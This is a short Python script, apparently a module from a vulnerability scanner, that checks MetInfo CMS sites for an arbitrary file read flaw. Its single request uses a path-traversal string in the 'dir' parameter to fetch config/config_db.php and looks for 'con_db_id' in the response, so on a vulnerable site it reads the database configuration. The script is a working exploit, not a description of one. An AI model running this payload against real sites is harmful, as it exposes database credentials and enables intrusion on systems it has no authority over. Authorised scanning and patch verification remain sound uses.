#!/usr/bin/env python3

'''
name: Metinfo任意文件读取漏洞
description: Metinfo任意文件读取漏洞
'''

from app.lib.utils.request import request


class Metinfo_Anyfile_Read_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_url = self.url + '/member/index.php?a=doshow&m=include&c=old_thumb&dir=http/./.../..././/./.../..././/config/config_db.php'
            req = request.get(check_url, headers = self.headers)
            if "con_db_id" in req.text  and req.status_code==200:
                print('存在Metinfo任意文件读取漏洞')
                return True
            else:
                print('不存在Metinfo任意文件读取漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在Metinfo任意文件读取')
            return False
        finally:
            pass

if __name__ == '__main__':
    Metinfo_Anyfile_Read = Metinfo_Anyfile_Read_BaseVerify('http://127.0.0.1:8080')
    Metinfo_Anyfile_Read.run()